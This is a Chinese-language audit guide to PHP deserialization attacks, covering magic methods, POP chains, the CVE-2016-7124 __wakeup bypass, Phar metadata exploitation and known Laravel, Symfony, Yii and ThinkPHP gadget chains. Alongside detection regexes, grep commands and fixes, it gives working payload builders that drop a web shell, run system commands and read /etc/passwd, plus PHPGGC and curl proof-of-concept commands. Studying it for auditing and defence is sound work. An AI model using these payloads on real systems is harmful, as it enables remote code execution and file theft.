# PHP Deserialization & POP Chains

> PHP 反序列化漏洞深度审计模块
> 覆盖: unserialize, Phar, POP Chains, 框架特定漏洞

---

## Overview

PHP 反序列化漏洞通过 `unserialize()` 函数触发，利用魔术方法链 (POP Chain) 实现代码执行。与 Python 不同，PHP 需要目标代码中存在可用的 Gadget 类。

---

## 核心原理

### 1. 魔术方法

```php
// 反序列化自动触发
__wakeup()      // 反序列化时调用 (PHP < 7.4 可绕过)
__destruct()    // 对象销毁时调用
__toString()    // 对象被当作字符串时调用
__call()        // 调用不存在的方法时
__callStatic()  // 调用不存在的静态方法时
__get()         // 访问不存在的属性时
__set()         // 设置不存在的属性时
__isset()       // 对不存在属性调用 isset() 时
__unset()       // 对不存在属性调用 unset() 时
__invoke()      // 对象被当作函数调用时

// 攻击链常用入口
__destruct() → 文件操作/命令执行
__toString() → 文件读取/写入
__wakeup()   → 初始化利用
__call()     → 方法调用链
```

### 2. 序列化格式

```
序列化格式说明:
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
│ │  │     │  │ │  │     │  │
│ │  │     │  │ │  │     │  └─ 值
│ │  │     │  │ │  │     └─ 类型:长度
│ │  │     │  │ │  └─ 属性名
│ │  │     │  │ └─ 类型:长度
│ │  │     │  └─ 属性数量
│ │  │     └─ 类名
│ │  └─ 类名长度
│ └─ Object 类型
└─ 类型标识

类型标识:
b - boolean    (b:1;)
i - integer    (i:123;)
d - double     (d:1.5;)
s - string     (s:5:"hello";)
a - array      (a:2:{i:0;s:1:"a";i:1;s:1:"b";})
O - object     (O:4:"User":1:{s:4:"name";s:5:"admin";})
N - null       (N;)
R - reference  (R:2;)
r - reference  (r:2;)
```

### 3. 属性访问修饰符

```php
// public 属性
O:4:"Test":1:{s:4:"name";s:5:"value";}

// protected 属性 (前缀 \x00*\x00)
O:4:"Test":1:{s:7:"\x00*\x00name";s:5:"value";}
// URL 编码: s:7:"%00*%00name";

// private 属性 (前缀 \x00ClassName\x00)
O:4:"Test":1:{s:10:"\x00Test\x00name";s:5:"value";}
// URL 编码: s:10:"%00Test%00name";
```

---

## POP Chain 构造

### 1. 基础 POP Chain 示例

```php
// 目标类
class FileHandler {
    public $filename;
    public $content;

    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}

// 利用
$obj = new FileHandler();
$obj->filename = '/var/www/html/shell.php';
$obj->content = '<?php system($_GET["cmd"]); ?>';
echo serialize($obj);

// O:11:"FileHandler":2:{s:8:"filename";s:25:"/var/www/html/shell.php";s:7:"content";s:31:"<?php system($_GET["cmd"]); ?>";}
```

### 2. 多类链式调用

```php
// 入口类
class Logger {
    public $handler;

    public function __destruct() {
        $this->handler->close();  // 触发 __call
    }
}

// 中间类
class Proxy {
    public $target;
    public $method;

    public function __call($name, $args) {
        return call_user_func([$this->target, $this->method]);
    }
}

// 终点类
class Command {
    public $cmd;

    public function execute() {
        system($this->cmd);
    }
}

// 构造 POP Chain
$cmd = new Command();
$cmd->cmd = 'id';

$proxy = new Proxy();
$proxy->target = $cmd;
$proxy->method = 'execute';

$logger = new Logger();
$logger->handler = $proxy;

echo serialize($logger);
```

### 3. __toString 利用

```php
class Template {
    public $file;

    public function __toString() {
        return file_get_contents($this->file);
    }
}

class Display {
    public $template;

    public function __destruct() {
        echo $this->template;  // 触发 __toString
    }
}

// 读取敏感文件
$tpl = new Template();
$tpl->file = '/etc/passwd';

$display = new Display();
$display->template = $tpl;

echo serialize($display);
```

---

## __wakeup 绕过

### CVE-2016-7124 (PHP < 5.6.25, < 7.0.10)

```php
// 当属性数量大于实际数量时，__wakeup 不会被调用
class Bypass {
    public $cmd = 'id';

    public function __wakeup() {
        $this->cmd = 'safe';  // 清理恶意数据
    }

    public function __destruct() {
        system($this->cmd);
    }
}

// 正常序列化
O:6:"Bypass":1:{s:3:"cmd";s:2:"id";}

// 绕过 __wakeup (属性数 1 改为 2)
O:6:"Bypass":2:{s:3:"cmd";s:2:"id";}
```

---

## Phar 反序列化

### 1. 原理

```php
// Phar 文件的 metadata 在读取时自动反序列化
// 无需 unserialize() 函数

// 触发函数 (文件操作函数)
file_exists()
file_get_contents()
file_put_contents()
file()
fopen()
include() / require()
is_dir() / is_file()
copy()
unlink()
stat()
filemtime()
filesize()
// ... 等 50+ 个函数
```

### 2. Phar 文件构造

```php
<?php
class Exploit {
    public $cmd = 'id';

    public function __destruct() {
        system($this->cmd);
    }
}

// 生成 Phar 文件
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$payload = new Exploit();
$phar->setMetadata($payload);  // 恶意对象存入 metadata

$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

### 3. 触发方式

```php
// 使用 phar:// 协议触发
file_exists('phar://uploads/exploit.phar/test.txt');
file_get_contents('phar://uploads/exploit.phar');
include('phar://uploads/exploit.phar/autoload.php');

// 绕过扩展名检测 (Phar 可伪装为任意扩展名)
$phar = 'phar://uploads/avatar.gif';  // 实际是 Phar 文件
file_exists($phar);  // 触发反序列化
```

### 4. Phar 签名绕过

```php
// Phar 文件结构
// Stub + Manifest + Contents + Signature

// 签名类型
// 0x0001: MD5
// 0x0002: SHA1
// 0x0003: SHA256
// 0x0004: SHA512

// 修改 metadata 后需要重新计算签名
```

---

## 框架 POP Chains

### Laravel

```php
// Laravel 已知 Gadget Chains (PHPGGC)

// RCE via PendingBroadcast
// Laravel 5.5 - 5.8
Illuminate\Broadcasting\PendingBroadcast
  → Illuminate\Bus\Dispatcher
    → system() / exec()

// RCE via PendingCommand
// Laravel 5.4 - 7.x
Illuminate\Foundation\Testing\PendingCommand
  → Illuminate\Container\Container
    → call_user_func()

// 使用 PHPGGC 生成
./phpggc Laravel/RCE1 system id
./phpggc Laravel/RCE2 'system' 'id'
```

### Symfony

```php
// Symfony POP Chains

// RCE via ProcessPipes
// Symfony 2.x - 4.x
Symfony\Component\Process\Pipes\WindowsPipes
  → Symfony\Component\Cache\Adapter\TagAwareAdapter
    → system()

// 使用 PHPGGC
./phpggc Symfony/RCE1 system id
```

### Yii

```php
// Yii2 POP Chain
// yii2 2.0.0 - 2.0.38

// 入口: BatchQueryResult::__destruct()
// 链路: ... → call_user_func()

./phpggc Yii2/RCE1 system id
```

### ThinkPHP

```php
// ThinkPHP 5.x POP Chain

// 入口: think\process\pipes\Windows::__destruct()
// 链路: removeFiles() → file_exists() → __toString()
//       → toJson() → __call() → call_user_func()

// ThinkPHP 6.x
// 入口: League\Flysystem\Cached\Storage\AbstractCache::__destruct()
```

### WordPress

```php
// WordPress 核心较少 POP Chain
// 但插件可能引入

// WooCommerce
// Elementor
// 等插件可能存在
```

---

## 检测规则

### 1. 危险函数

```regex
# unserialize 检测
unserialize\s*\(.*\$_(GET|POST|REQUEST|COOKIE)
unserialize\s*\(.*file_get_contents
unserialize\s*\([^)]*\$[a-zA-Z_]

# Phar 触发函数
(file_exists|file_get_contents|file|fopen|include|require)\s*\(.*phar://
(is_dir|is_file|copy|unlink|stat)\s*\(.*\$

# 序列化数据特征
['"](O|a|s):[0-9]+:
```

### 2. 危险类特征

```regex
# 危险魔术方法
function\s+__destruct\s*\(.*\{[^}]*(system|exec|passthru|shell_exec|eval|file_put_contents|unlink)
function\s+__wakeup\s*\(
function\s+__toString\s*\(.*\{[^}]*file_get_contents

# 危险方法调用
call_user_func(_array)?\s*\(\s*\$
\$[a-zA-Z_]+\s*\(\s*\$  # 动态函数调用
```

---

## 审计清单

```
[ ] 搜索所有 unserialize() 调用
[ ] 检查反序列化数据来源是否可控
[ ] 搜索可用的 Gadget 类 (__destruct, __wakeup, __toString 等)
[ ] 检查文件操作函数是否接受用户输入路径
[ ] 检查是否存在 Phar 反序列化触发点
[ ] 检查框架版本，对照已知 POP Chain
[ ] 使用 PHPGGC 测试已知 Gadget
[ ] 检查 __wakeup 是否可绕过 (PHP 版本)
[ ] 检查 Phar 文件上传点
```

---

## 检测命令

```bash
# unserialize 检测
grep -rn "unserialize\s*(" --include="*.php"

# 危险魔术方法
grep -rn "function\s*__destruct\|function\s*__wakeup\|function\s*__toString" --include="*.php"

# Phar 相关
grep -rn "phar://\|new Phar\|setMetadata" --include="*.php"

# 文件操作 + 用户输入
grep -rn "file_exists\|file_get_contents" --include="*.php" | grep "\$_"

# 动态函数调用
grep -rn "call_user_func\|call_user_func_array" --include="*.php"

# 使用 PHPGGC 列出可用链
./phpggc -l | grep "Laravel\|Symfony\|ThinkPHP\|Yii"
```

---

## 安全修复

### 1. 禁用 unserialize

```php
// 使用 JSON 替代
$data = json_decode($input, true);

// 如必须使用，限制允许的类
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);

// 完全禁止类实例化
$data = unserialize($input, ['allowed_classes' => false]);
```

### 2. 签名验证

```php
function secure_serialize($data, $key) {
    $serialized = serialize($data);
    $signature = hash_hmac('sha256', $serialized, $key);
    return base64_encode($signature . '|' . $serialized);
}

function secure_unserialize($data, $key, $allowed_classes) {
    $decoded = base64_decode($data);
    list($signature, $serialized) = explode('|', $decoded, 2);

    $expected = hash_hmac('sha256', $serialized, $key);
    if (!hash_equals($expected, $signature)) {
        throw new Exception('Invalid signature');
    }

    return unserialize($serialized, ['allowed_classes' => $allowed_classes]);
}
```

### 3. 禁用 Phar

```php
// php.ini
phar.readonly = On

// 代码层面过滤
$path = str_replace(['phar://', 'PHAR://'], '', $path);

// 或检查协议
if (preg_match('/^phar:/i', $path)) {
    throw new Exception('Phar protocol not allowed');
}
```

---

## 参考资源

- [PHPGGC](https://github.com/ambionics/phpggc)
- [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [Phar Deserialization](https://blog.ripstech.com/2018/new-php-exploitation-technique/)

---

## 最小 PoC 示例
```bash
# PHPGGC 生成链
phpggc Laravel/RCE1 system id | base64 > payload.txt
curl -X POST http://localhost/api -d @payload.txt

# Phar 触发
php -d phar.readonly=0 -r '$phar=new Phar("p.phar"); $phar->addFromString("test","test"); $phar->setStub("<?php __HALT_COMPILER(); ?>");'
curl "http://localhost/index.php?file=phar://./p.phar/test"
```

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
